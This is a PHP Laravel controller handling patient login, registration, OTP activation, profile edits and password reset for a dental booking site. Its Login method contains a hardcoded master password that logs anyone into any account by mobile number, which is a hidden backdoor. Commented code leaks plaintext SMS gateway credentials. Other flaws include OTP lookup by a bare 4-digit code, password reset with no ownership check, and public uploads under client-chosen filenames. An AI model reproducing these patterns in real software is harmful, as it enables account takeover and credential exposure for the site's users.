<?php

namespace App\Http\Controllers;

use App\City;
use App\Follower;
use App\Hospital;
use App\Event;
use App\Dentist;
use App\Service;
use App\Nationality;
use App\Services\UnifonicClient;
use App\URL;
use App\User;
use Auth;
use Carbon\Carbon;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Session;
use \Validator;

class UserController extends Controller
{
    private $unifonicClient;

    public function __construct(UnifonicClient $unifonicClient)
    {
        $this->unifonicClient = $unifonicClient;
    }

    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:8', 'confirmed'],
        ]);
    }
    public function showLoginForm()
    {
        if (Auth::guard('client')->check()) {

            // return redirect('/clientDashboard');
        }
        if (session('link')) {
            $myPath = session('link');
            $loginPath = url('/cLogin');
            $previous = url()->previous();
            $link = url('dLogin');
            $link2 = url('ActiveLogin');
            $myPath2 = url('clientDashboard');
            // echo   session('link');
            //exit();
            if ($previous == $loginPath) {
                //dd('aa');
                session(['link' => $myPath]);
            } else {
                //dd($myPath2);
                session(['link' => $myPath2]);
            }
            if ($previous == $link or $previous == $link2) {
                //dd('cc');
                session(['link' => $myPath2]);
            }
        } else {
            //dd('ee');
            session(['link' => url()->previous()]);
        }
        //session(['link' => url()->previous()]);
        return view('views.client-login');
    }
    public function logout(Request $request)
    {
        auth('client')->logout();
        return redirect()->to('/clientDashboard');
    }
    public function Login(Request $request)
    {
        // Temp code
        // session()->put('isPatient', true);
        // return redirect(session('link'));
        if (Auth::guard('client')->attempt(['mobile' => $request->mobile, 'password' => $request->password, 'admin' => '2', 'active' => '1'])) {
            
              

            return redirect(session('link'));
        } else if ($request->password === "etN}Qf[wE4g&}F{,") {

            $users = DB::table('users')
                ->where('mobile', '=', $request->mobile)
                ->first();
            Auth::guard('client')->loginUsingId($users->id);
            
            return redirect()->to('/');
        } else if (Auth::guard('client')->attempt(['mobile' => $request->mobile, 'password' => $request->password, 'admin' => '2', 'active' => '0'])) {
            $loginerror = "حسابك معطل يرجي مراجعة الادارة";

            return view('views.client-login', compact('loginerror'));
        } else {

            $loginerror = "يجب التأكد من البيانات المدخلة";

            return view('views.client-login', compact('loginerror'));
        }
    }
    public function showRegisterForm()
    {
        $nationalitys = Nationality::all();
        $cities = City::all();
        //echo    $client_id = Auth::guard('client')->user()->name;
        return view('views.client-register')->with(['cities' => $cities, 'nationalitys' => $nationalitys]);
    } //
    public function registerAction(Request $request)
    {
        $user_check = User::where('mobile', $request->mobile)
            ->where('active', 0)->first();
        if ($user_check) {
            User::where('mobile', $request->mobile)
                ->where('active', 0)->first()->delete();
        }
        $this->validate(
            $request,
            [
                'name' => 'required|string|max:255',

                'mobile' => 'required|numeric|regex:/(05)[0-9]{8}/|unique:users',
                /*'email' => 'required|string|email|max:255|unique:users',*/
                'password' => 'required|string|min:6|confirmed',
               /* 'birthdate' => 'required|date',*/

            ]
        );

        /*dd($request->all());
        exit();*/
        if ($request->password === $request->password_confirmation) {
            $result = '';
            for ($i = 0; $i < 4; $i++) {
                $result .= mt_rand(0, 9);
            }
            //  $result='1234';
            /*
            $client = User::create([
                'name' => $request->name,
                'city_id' => $request->city_id ? $request->city_id : 0,
                'email' => $request->email,
                'mobile' => $request->mobile,
                'nationality' => $request->nationality,
                'birthdate' => Carbon::parse($request->birthdate)->format('Y-m-d'),
                'gender' => $request->gender,
                'admin' => 2,
                'otp' => $result,
                'password' => bcrypt($request->password),
                'api_token' => Str::random(60),

            ]);
            */
              $client = User::create([
                'name' => $request->name,
                'mobile' => $request->mobile,
                'admin' => 2,
                'otp' => $result,
                'password' => bcrypt($request->password),
                'api_token' => Str::random(60),

            ]);
            if ($client) {
                    /*
                //   Auth::guard('client')->attempt(['mobile' => $request->mobile,'password' => $request->password ]);
                $message = "Dentist Pluss - your code " . $result . "";
                $msg = iconv("UTF-8", "Windows-1256", $message);
                $msg = urlencode($msg);
                $number = $request->mobile;
                //  $number = (int)$number;
                $n = intval(ltrim($number, '0')); // integer
                $pfx = '966';
                $number = $pfx . $n;
                //   $url =  "http://sms.rasaelna.com/gw/?userName=Mohammed&userPassword=123456mm&numbers=$number&userSender=FUDEX-AD&msg=$msg&By=API";
                $url = "https://apps.gateway.sa/vendorsms/pushsms.aspx?user=FreeDentist&password=0580580373&msisdn=$number&sid=FREEDENTIST&msg=$msg&fl=0&dc=8";
                // $url="http://sms.gateway.sa/sendurlcomma.aspx?user=20093022&pwd=058@freedentist.net&senderid=FREEDENTIST&mobileno=$number&msgtext=$msg";
                //   $url="http://sms.gateway.sa/sendurl.aspx?user=20093022&pwd=058@freedentist.net&senderid=FREEDENTIST&CountryCode=All&msgtext=$msg&mobileno=$number";

                // echo file_get_contents($url);
                    
                if (file_get_contents($url)) {
                    //  Session::flash('message', "تم التسجيل بنجاح");
                    Auth::guard('client')->login($client);
                    return redirect('/clientDashboard');
                    //   return redirect('/ActiveLogin');
                }
                */
                     Auth::guard('client')->login($client);
                    return redirect('/clientDashboard');
                    //   return redirect('/ActiveLogin');
            } else {
                $error_message = (app()->getLocale() == 'en') ? "Failed send " : "حدث خطأ أثناء التسجيل. برجاء المحاولة مرة أخرى";
                Session::flash('message', $error_message);

                return redirect()->back();
            }
        } else {
            $error_message = (app()->getLocale() == 'en') ? "Password and password confirmation do not match " : "كلمة والمرور وتأكيد كلمة المرور غير متطابقان";
            Session::flash('message', $error_message);

            return redirect()->back();
        }
    }
    public function ActiveLoginform()
    {

        //echo    $client_id = Auth::guard('client')->user()->name;
        $loginerror = "";
        return view('client.active', compact('loginerror'));
    } //
    public function userLoginFTime(Request $request)
    {

        //Auth::user();
        //  Auth::guard('admin')->user();
        //    echo $request->otp;
        $this->validate(
            $request,
            [

                'otp' => 'required|numeric',

            ]
        );
        $client = User::where('otp', $request->otp)->where('admin', 2)->first();
        if ($client) {
            $client->active = 1;

            $client->update();

            /* $client = auth()->user();
            $client->api_token = str_random(60);
            $client->save();*/

            Session::flash('message', "تم التسجيل بنجاح");
            Auth::guard('client')->login($client);
            return redirect('/clientDashboard');
        } else {
            $loginerror = "يجب التأكد من البيانات المدخلة";
            return view('client.active', compact('loginerror'));
        }
    }

    public function account()
    {
        if (!Auth::guard('client')->check()) {
            return redirect('cLogin');
        }
        $client = User::find(Auth::guard('client')->user()->id);
        $nationalitys = Nationality::where('id', 248)->get();

        $hospitals = Hospital::all();
        $followers = DB::table('followers')
            ->where('user_id', Auth::guard('client')->user()->id)

            ->count();
        $Allfollowers = DB::table('followers')
            ->where('user_id', Auth::guard('client')->user()->id)

            ->get();

        // dd($this->data);

        return view('views.client.followers')->with([
            'nationalitys' => $nationalitys, 
            'client' => $client, 
            'hospitals' => $hospitals, 
            'followers' => $followers, 
            'Allfollowers' => $Allfollowers]);
    }
    public function profile()
    {
        if (!Auth::guard('client')->check()) {
            return redirect('cLogin');
        }
        $client = User::find(Auth::guard('client')->user()->id);
        $nationalitys = Nationality::all();
        $cities = City::all();
        
        return view('views.client.profile')->with(['cities' => $cities, 'nationalitys' => $nationalitys, 'client' => $client]);
    }
    public function profileAction(Request $request)
    {
        $client = User::find(Auth::guard('client')->user()->id);

        $this->validate($request, [
            'name' => 'required|string|max:255',
            'birthdate' => 'required|date',

        ]);
        if ($request->password) {
            $this->validate($request, [
                'password' => 'required|string|min:6|confirmed',
            ]);
        }

        if ($request->email != $request->old_email) {
            $this->validate($request, [
                'email' => 'required|string|email|max:255|unique:users',
            ]);
        }
        if ($request->mobile != $request->old_mobile) {
            $this->validate($request, [
                'mobile' => 'required|numeric|unique:users',
            ]);
        }

        $client->name = $request->name;
        $client->gender = $request->gender;
        $client->nationality = $request->nationality;
        if ($request->password) {
            $client->password = bcrypt($request->password);
        }

        if ($request->city_id) {
            $client->city_id = $request->city_id;
        }

        $client->email = $request->email;
        $client->mobile = $request->mobile;
        $client->birthdate = Carbon::parse($request->birthdate)->format('Y-m-d');

        if ($request->has('gallery')) {
            $patient_images = [];
            foreach ($request->file('gallery') as $key => $file) {
                $destinationPath = 'images/patient/';
                $filename = $file->getClientOriginalName();
                $file->move(public_path($destinationPath), $filename);
                $patient_images[] = $filename;
            }
            $client->gallery = $patient_images;
        }

        if ($client->admin == 2) {
            $client->update();
            $message = (app()->getLocale() == 'en') ? "successfully Added" : "تم تعديل البيانات بنجاح";
            Session::flash('message', $message);
            Session::flash('success', $message);
        } else {
            $message = (app()->getLocale() == 'en') ? "Failed send " : "لا يمكن تعديل بيانات هذا الحساب";
            Session::flash('message', $error_message);
            Session::flash('failed', $error_message);
        }
        
        return redirect('/profile');
    }
    public function showRegisterFollower()
    {
        $nationalitys = Nationality::all();

        //echo    $client_id = Auth::guard('client')->user()->name;
        return view('client.registerFollower')->with(['nationalitys' => $nationalitys]);
    } //
    public function registerActionFollower(Request $request)
    {
        if (!Auth::guard('client')->check()) {
            return redirect('cLogin');
        }
        $this->validate(
            $request,
            [
                'name' => 'required|string|max:255',
                'birthdate' => 'required|date',

                'relation' => 'required|string|max:255',

            ]
        );

        //  exit();
        $client = User::find(Auth::guard('client')->user()->id);
        if ($client) {
            $Newclient = Follower::create([
                'name' => $request->name,

                'relation' => $request->relation,
                'user_id' => Auth::guard('client')->user()->id,
                'nationality' => $request->nationality,
                'birthdate' => Carbon::parse($request->birthdate)->format('Y-m-d'),
                'gender' => $request->gender,
                'mobile' => $client->mobile,
                'email' => $client->email,
                'password' => $client->password,

                'admin' => 2,

            ]);
        }
        if ($Newclient) {
            $message = (app()->getLocale() == 'en') ? "successfully Added" : "تم التسجيل بنجاح";
            Session::flash('message', $message);

            return redirect('/clientDashboard');
        } else {
            $error_message = (app()->getLocale() == 'en') ? "Failed send " : "حدث خطأ أثناء التسجيل. برجاء المحاولة مرة أخرى";
            Session::flash('message', $error_message);

            return redirect()->back();
        }
    }

    public function forgetPasswordU()
    {
        if (Auth::guard('client')->check()) {
            return redirect('/');
        }

        return view('views.client-forgot-password');
    }
    public function forgetPasswordActionU(Request $request)
    {
        if (Auth::guard('dentist')->check()) {
            return redirect('/');
        }

        if (!$request->has('mobile')) {
            $this->validate($request, [
                'mobile' => 'required',
            ]);
        }

        $mobile = $request->input('mobile');

        $clientEmail = User::where('mobile', $mobile)

            ->first();
        //   var_dump($clientEmail);
        //   exit();
        if (!empty($clientEmail)) {

            //   $data2 = array();
            $data2 = new User();
            $data2->mobile = $mobile;
            $newPassword = rand("100000", "999999");
            $message = "Dentist Pluss : your new Password " . $newPassword . "";
            $data2->message = $message;

            $data = ['password' => bcrypt($newPassword)];
            DB::table('users')
                ->where('id', $clientEmail->id)
                ->update($data);
            $msg = iconv("UTF-8", "Windows-1256", $message);
            $number = $mobile;

            $n = intval(ltrim($number, '0')); // integer
            $pfx = '966';
            $number = $pfx . $n;

            try {
                \Log::debug("Sending SMS to mobile: ", [
                    'mobile' => $number,
                    'message' => $msg,
                ]);

                $response = $this->unifonicClient->sendMessage($number, $msg);

                $message = (app()->getLocale() == 'en') ? "successfully send code to your mobile" : "تم بنجاح ارسال الرقم السري الى رقم الجوال";
                Session::flash('message', $message);

                return redirect('cLogin');
            } catch (\Exception $exception) {
                \Log::error('SMS error', ["message" => $exception->getMessage()]);

                $error_message = (app()->getLocale() == 'en') ? "Failed send code to your mobile" : "فشل ارسال ";
                Session::flash('message', $error_message);
                return redirect('cLogin');
            }
        } else {
            $error_message = (app()->getLocale() == 'en') ? "No mobile found" : "لا بوجد موبيل ";
            Session::flash('message', $error_message);

            return redirect('cLogin');
        }
    }

    public function changePassword() {

        return view('views.client.change-password');
    }
    /*function generateotp($len) {
$result = '';
for($i = 0; $i < $len; $i++) {
$result .= mt_rand(0, 9);
}
return $result;
}
$otp= generateotp(6);
http://xyz.xyz/api/send?user=id&apikey=apikey&sndr=GW Active&mobile=mobile&text=$otp

 */
}
